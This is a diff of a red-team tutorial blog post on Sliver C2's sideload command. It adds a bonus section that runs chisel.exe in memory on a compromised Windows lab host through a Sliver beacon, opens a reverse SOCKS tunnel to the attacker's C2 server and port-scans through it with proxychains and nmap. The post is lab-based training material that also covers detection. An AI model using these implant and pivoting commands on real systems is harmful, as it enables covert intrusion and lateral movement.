@@ -6,6 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Learning Sliver C2 (10) - Sideload | text/plain</title>
     <meta name="description" content="Deep-dive into the sideload command Sliver provides for execution of native shared libraries, including Windows DLLs.
+It also supports execution of EXEs on Windows.
 I show how to use the command but also how it works under the hood.
 We cover both Sliver itself as well as Donut, which Sliver depends on.
 On top there are some brief notes on detection.
@@ -22,6 +23,7 @@ On top there are some brief notes on detection.
 
     <meta property="og:title" content="Learning Sliver C2 (10) - Sideload" />
 <meta property="og:description" content="Deep-dive into the sideload command Sliver provides for execution of native shared libraries, including Windows DLLs.
+It also supports execution of EXEs on Windows.
 I show how to use the command but also how it works under the hood.
 We cover both Sliver itself as well as Donut, which Sliver depends on.
 On top there are some brief notes on detection.
@@ -240,12 +242,13 @@ input:valid {
   <article itemscope itemtype="http://schema.org/BlogPosting">
     <meta itemprop="name" content="Learning Sliver C2 (10) - Sideload">
 <meta itemprop="description" content="Deep-dive into the sideload command Sliver provides for execution of native shared libraries, including Windows DLLs.
+It also supports execution of EXEs on Windows.
 I show how to use the command but also how it works under the hood.
 We cover both Sliver itself as well as Donut, which Sliver depends on.
 On top there are some brief notes on detection.
 "><meta itemprop="datePublished" content="2023-02-04T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2023-02-04T00:00:00+00:00" />
-<meta itemprop="wordCount" content="7170"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="wordCount" content="7747"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
 <meta itemprop="keywords" content="c2,sliver,tutorial,implant,sideload,donut,DLL,PE," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -255,7 +258,7 @@ On top there are some brief notes on detection.
   <circle cx="16" cy="16" r="14" />
   <path d="M16 8 L16 16 20 20" />
 </svg>
-<span>34 minute read</span>
+<span>37 minute read</span>
 <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
@@ -267,6 +270,7 @@ On top there are some brief notes on detection.
     </header>
     
       <blockquote itemprop="description">Deep-dive into the sideload command Sliver provides for execution of native shared libraries, including Windows DLLs.
+It also supports execution of EXEs on Windows.
 I show how to use the command but also how it works under the hood.
 We cover both Sliver itself as well as Donut, which Sliver depends on.
 On top there are some brief notes on detection.
@@ -292,6 +296,7 @@ On top there are some brief notes on detection.
       </ul>
     </li>
     <li><a href="#detection">Detection</a></li>
+    <li><a href="#bonus-section-loading-exes">Bonus Section: Loading EXEs</a></li>
   </ul>
 </nav>
   </details>
@@ -314,13 +319,15 @@ On top there are some brief notes on detection.
     <div itemprop="articleBody">
       <h1 id="sliver-c2">Sliver C2</h1>
 <p>This post is part of a tutorial blog post series on Sliver C2 (used here in version v1.5.30).
-For an overview: <a href="../../post/learning_sliver_c2_01_installation/">click here</a>.</p>
+For an overview: <a href="../../post/learning_sliver_c2_01_installation/#series-overview">click here</a>.
+As of March 6 2023, this post got a new bonus section to illustrate execution of Windows PE EXE files with <code>sideload</code>.
+The rest of the text was also updated, but only here and there.</p>
 <h2 id="introduction">Introduction</h2>
 <p>The previous <a href="../../post/learning_sliver_c2_09_execute_assembly/">post 9</a> was about
 making a Windows implant run 3rd party tools. One limitation was that <code>execute-assembly</code>,
 the command we used, could only run tools written in .NET. In this post we therefore
-learn about the <code>sideload</code> command. It supports execution of native DLLs in
-Portable Executable (PE) format.</p>
+learn about the <code>sideload</code> command. It supports execution of native executables in
+Portable Executable (PE) format, both DLLs and EXEs.</p>
 <p>Readers of the post about <code>execute-assembly</code> will notice considerable similarities with this one.
 Both <code>execute-assembly</code> and <code>sideload</code> basically use <a href="https://github.com/TheWover/donut">Donut</a>
 to turn the payload into shellcode and then inject that into a process on the target machine.
@@ -336,7 +343,11 @@ First we&rsquo;ll create a sample DLL that opens a password dialog box and sends
 We will then see how <code>sideload</code> can be used to run it on a target and what options exist to customize execution.
 I&rsquo;ll follow up with a short review of Sliver source code before we go in depth into the PE-specific parts of Donut.
 Finally I&rsquo;ll briefly show what Sysmon records when you sideload a DLL.</p>
-<p>I created a small lab for myself where I try out all these things.
+<p>There is now also a <a href="../../post/learning_sliver_c2_10_sideload/#bonus-section-loading-exes">bonus section</a>
+at the end to illustrate execution of a PE EXE file.
+After writing this post I learned that running EXEs is possible too and updated this post.
+While reading, keep in mind that much of what I write about DLLs applies to EXEs too.</p>
+<p>I created a small lab where I try out all these things.
 You may want one for yourself to follow along.
 Thus I start with a brief description of it so that you have an idea of the environment.</p>
 <h2 id="preparations">Preparations</h2>
@@ -724,6 +735,12 @@ You decide:</p>
 <li>Save to disk: enable with <code>--save</code></li>
 <li>Just watch: don&rsquo;t set any of these flags and you just get the output printed out.</li>
 </ul>
+<p>Note that the help text could give the wrong impression that the command can only execute Windows DLLs.
+Thanks to a little hint from one of the masters himself (<a href="https://twitter.com/rkervell">rkervell</a>), the obvious has become clear to me.
+Because the command is built on top of Donut and because Donut supports EXEs and DLLs,
+you can just give an EXE to <code>sideload</code> and it will run too.
+No need to fiddle with your tools to make DLLs out of EXEs.
+Check out the <a href="../../post/learning_sliver_c2_10_sideload/#bonus-section-loading-exes">bonus section</a> for a demonstration.</p>
 <h3 id="customization">Customization</h3>
 <p>To see what the flags could be good for, consider the following example.
 I&rsquo;ll use the <code>--process</code> argument to specify a better process to launch.
@@ -1913,6 +1930,45 @@ As far as I know this cannot be avoided with Sliver unless you fork the implant 
 <p>With regards to the activity of Donut itself I did not spot any tell-tale events.
 Of course you may, for example, see events related to the loading of imported libraries.
 But all that is more related to the DLL you run, not to Donut running it.</p>
+<h2 id="bonus-section-loading-exes">Bonus Section: Loading EXEs</h2>
+<p>In most of this post I wrote about running native Windows DLLs with <code>sideload</code>.
+Originally I assumed this would be all this command can do.
+But then <a href="https://twitter.com/rkervell">Ronan Kervella</a> was kind enough to give me the tip
+that both DLLs and EXEs can be run this way.
+Obvious in hindsight since it is all build on Donut and Donut can do both.
+Just don&rsquo;t read the help text too much.</p>
+<p>With Ronan being one of the creators of Sliver, we can probably all be confident enough that it will work.
+Here is a short demonstration nevertheless, just to give it a go.
+I want to run <a href="https://github.com/jpillora/chisel">chisel</a> to set up a SOCKS proxy into the target network.
+To do that, I first clone the repository and build a Linux and Windows executable.
+Easy to do if you just <code>cd</code> into the repository, then run <code>make windows</code> and <code>make linux</code>,
+which puts your executables somewhere into the <code>build/</code> subdirectory.</p>
+<p>Start the chisel Linux executable on the C2 server with <code>chisel server -p 8000 --reverse</code>.
+It will listen on port 8000 and accept clients requesting reverse SOCKS proxies.</p>
+<p>The chisel client must be started on the Windows target.
+What we got is a Windows EXE file and as we now know there is no need to fiddle with the source to make it build a DLL.
+Move the EXE into a convenient place and convince yourself one last time
+that this is actually an PE executable file, not a DLL.
+I&rsquo;ve put it to <code>/home/kali/binaries/chisel.exe</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ file /home/kali/binaries/chisel.exe
+/home/kali/binaries/chisel.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 6 sections
+</code></pre><p>Switch to the Sliver console and use your beacon to start the client.
+The <code>sideload</code> command can look as shown below. Just don&rsquo;t give it an entry point:</p>
+<pre tabindex="0"><code>sliver (FAT_SOMEWHERE) &gt; sideload /home/kali/binaries/chisel.exe client 192.168.122.111:8000 R:socks
+
+[*] Tasked beacon FAT_SOMEWHERE (994f5217)
+</code></pre><p>If it worked, your chisel server should receive the connection:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ chisel server -p 8000 --reverse
+2023/03/05 22:13:13 server: Reverse tunnelling enabled
+2023/03/05 22:13:13 server: Fingerprint hRSpdDW6Oz4HbkvmN9gwWXrsqH0wP5b7tB3sk7dg59I=
+2023/03/05 22:13:13 server: Listening on http://0.0.0.0:8000
+2023/03/05 22:14:02 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
+</code></pre><p>You now have a solid, performant proxy into the target environment.
+Try adding <code>socks5  127.0.0.1 1080</code> into <code>/etc/proxychains4.conf</code> and then
+run a port scan on the target.
+For example, <code>proxychains nmap -sT -sV -n -Pn -p 445 127.0.0.1 -v</code> should report port 445 as open.</p>
 
     </div>
     
@@ -1934,7 +1990,7 @@ But all that is more related to the DLL you run, not to Donut running it.</p>
   
     and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/dll/">DLL</a>, <a href="/tags/donut/">donut</a>, <a href="/tags/implant/">implant</a>, <a href="/tags/pe/">PE</a>, <a href="/tags/sideload/">sideload</a>, <a href="/tags/sliver/">sliver</a> and <a href="/tags/tutorial/">tutorial</a>
   
-  using <span itemprop="wordCount">7170</span> words.
+  using <span itemprop="wordCount">7747</span> words.
 </p>
 
       
